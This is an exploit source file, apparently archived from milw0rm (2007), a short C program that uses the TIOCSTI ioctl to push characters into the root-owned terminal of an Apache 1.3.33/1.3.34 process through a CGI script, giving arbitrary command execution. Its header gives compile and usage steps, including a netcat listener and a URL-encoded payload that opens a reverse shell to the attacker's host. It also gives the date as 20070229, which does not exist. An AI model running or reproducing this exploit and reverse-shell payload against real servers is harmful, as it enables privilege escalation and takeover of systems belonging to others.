/*
  :: Kristian Hermansen ::
  Date: 20070229
  Description: Local attacker can influence Apache to direct commands
    into an open tty owned by user who started apache process, usually root.
    This results in arbitrary command execution.
  Affects: Apache 1.3.33/1.3.34 on Debian Stable/Testing/Unstable/Experimental     and Ubuntu Warty (4.10)/Hoary (5.04)/Breezy (5.10)/Dapper (6.06)
    Edgy (6.10), Feisty (7.04).
  Notes: Must have CGI execution privileges and
    service started manually by root via shell.
    Also try adding "Options +ExecCGI" to your .htaccess file.
  Compile: gcc -o /path/to/cgi-bin/cgipwn cgipwn.c
  Usage: nc -vvv -l -p 31337
    http://webserver/cgi-bin/cgipwn?nc%20myhost%2031337%20-e%20%2fbin%2f/sh%0d
  u53l355 gr33t5: yawn, jellyfish, phzero, pegasus, b9punk, phar, shardy,
    benkurtz, ... and who could forget ... setient (the gremlin)!!
*/

#include <fcntl.h>
#include <sys/ioctl.h>

int main(int argc, char *argv[]) {
  int pts = open("/dev/tty",O_RDONLY);
  while(*argv[1] != '\0') {
    ioctl(pts,TIOCSTI,argv[1]);
    argv[1]++;
  }
  return 0;
}

// milw0rm.com [2007-02-28]
